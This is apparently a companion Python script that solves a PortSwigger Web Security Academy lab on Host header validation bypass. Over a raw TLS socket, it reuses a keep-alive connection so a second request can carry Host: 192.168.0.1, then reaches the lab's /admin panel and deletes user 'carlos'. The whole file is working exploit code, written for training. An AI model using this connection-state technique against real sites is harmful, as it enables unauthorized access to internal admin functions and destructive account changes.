#!/usr/bin/env python3
"""
Host validation bypass via connection state attack
PortSwigger Web Security Academy -- HTTP Host Header Attacks

Companion script for the writeup: 06-host-validation-bypass-via-connection-state-attack.md

What this does -- and why it needs raw sockets:
    The front-end here validates the Host header only on the FIRST request
    of a keep-alive connection and assumes every later request on that same
    connection targets the same host. Exploiting that means keeping one
    literal TCP/TLS connection open across two full HTTP/1.1 request/response
    cycles: send a legitimate-Host request with Connection: keep-alive, read
    the response, then send a second request with Host: 192.168.0.1 down the
    SAME socket. httpx's connection pooling and request/response handling
    doesn't expose that kind of manual two-request sequencing on one socket,
    so this script opens the raw TLS socket itself and writes both cycles by
    hand. Session cookies must be present on both requests -- without them
    the pair returns 421 Misdirected Request instead of the bypass.

Usage:
    python 06-host-validation-bypass-via-connection-state-attack.py <lab-url>
    e.g. python 06-host-validation-bypass-via-connection-state-attack.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import socket
import ssl
import sys
from urllib.parse import urlparse

import httpx

INTERNAL_HOST = "192.168.0.1"


def _read_one_http_response(ssock) -> bytes:
    """Read exactly one HTTP/1.1 response off the socket, respecting Content-Length/chunking."""
    buf = b""
    while b"\r\n\r\n" not in buf:
        data = ssock.recv(1)
        if not data:
            return buf
        buf += data
    header_end = buf.find(b"\r\n\r\n")
    headers = buf[:header_end].decode(errors="replace")
    body_so_far = buf[header_end + 4:]
    cl_m = re.search(r"Content-Length:\s*(\d+)", headers, re.IGNORECASE)
    if cl_m:
        cl = int(cl_m.group(1))
        while len(body_so_far) < cl:
            data = ssock.recv(cl - len(body_so_far))
            if not data:
                break
            body_so_far += data
    elif "chunked" in headers.lower():
        while b"0\r\n\r\n" not in body_so_far:
            data = ssock.recv(4096)
            if not data:
                break
            body_so_far += data
    return (headers + "\r\n\r\n").encode() + body_so_far


def _connection_state_attack(
    target_host: str,
    cookie_str: str,
    second_method: str = "GET",
    second_path: str = "/admin",
    second_body: str = "",
) -> tuple[int, str]:
    """Send a legitimate-Host request first, then Host: 192.168.0.1 on the same connection."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    sock = socket.create_connection((target_host, 443), timeout=15)
    ssock = ctx.wrap_socket(sock, server_hostname=target_host)

    req1 = (
        f"GET / HTTP/1.1\r\nHost: {target_host}\r\n"
        f"Cookie: {cookie_str}\r\nConnection: keep-alive\r\n\r\n"
    )
    ssock.sendall(req1.encode())
    _read_one_http_response(ssock)  # discard -- just refreshes validation for this connection

    req2 = f"{second_method} {second_path} HTTP/1.1\r\nHost: {INTERNAL_HOST}\r\n"
    req2 += f"Cookie: {cookie_str}\r\n"
    if second_body:
        req2 += "Content-Type: application/x-www-form-urlencoded\r\n"
        req2 += f"Content-Length: {len(second_body)}\r\n"
    req2 += "Connection: close\r\n\r\n"
    if second_body:
        req2 += second_body
    ssock.sendall(req2.encode())

    resp2 = b""
    while True:
        try:
            data = ssock.recv(4096)
            if not data:
                break
            resp2 += data
        except Exception:
            break
    ssock.close()
    resp_str = resp2.decode("utf-8", errors="replace")
    parts = resp_str.split("\r\n")[0].split()
    code = int(parts[1]) if len(parts) > 1 else 0
    return code, resp_str


def solve(lab_url: str) -> None:
    target_host = urlparse(lab_url).hostname

    print("[*] Getting session cookies from a normal homepage visit...")
    client = httpx.Client(verify=False, timeout=10)
    client.get(lab_url)
    cookies = dict(client.cookies)
    cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
    print(f"[*] Cookies: {list(cookies.keys())}")

    print(f"[*] Accessing /admin via connection state attack (Host: {INTERNAL_HOST})...")
    code, resp = _connection_state_attack(target_host, cookie_str)
    print(f"[*] /admin status: {code}")

    csrf_m = re.search(r'name="csrf"\s+value="([^"]+)"', resp)
    csrf = csrf_m.group(1) if csrf_m else ""
    if not csrf:
        print("[-] No CSRF token found -- the connection-state bypass may not have worked.")
        return
    print(f"[*] CSRF: {csrf[:20]}...")

    new_sess = re.search(r"Set-Cookie:\s*session=([^;\r\n]+)", resp)
    if new_sess:
        cookies["session"] = new_sess.group(1)
        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())

    print("[*] Deleting carlos via the same connection-state attack...")
    body = f"csrf={csrf}&username=carlos"
    code2, resp2 = _connection_state_attack(
        target_host, cookie_str, second_method="POST", second_path="/admin/delete", second_body=body,
    )
    print(f"[*] Delete status: {code2}")

    if code2 == 302 or "Congratulations" in resp2:
        print("[+] Lab solved -- carlos deleted via connection state attack.")
    else:
        check = client.get(lab_url)
        if "Congratulations" in check.text:
            print("[+] Lab solved -- carlos deleted via connection state attack.")
        else:
            print("[-] Not solved yet -- inspect the delete response.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
